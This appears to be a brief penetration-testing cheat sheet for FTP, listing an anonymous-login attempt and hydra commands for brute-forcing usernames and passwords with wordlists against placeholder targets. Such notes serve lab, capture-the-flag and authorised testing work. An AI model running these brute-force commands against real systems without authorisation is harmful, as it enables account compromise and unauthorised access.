Try anonymous login​

# empty pass | email
ftp anonymous@<ip>

Bruteforce​

# use -p to specify a custom port
# hydra known user
hydra -l <user> -P /usr/share/wordlists/<pass_list> -t 4 ftp

# hydra users and passwords
hydra -L <user_list> -P /usr/share/wordlists/<pass_list>
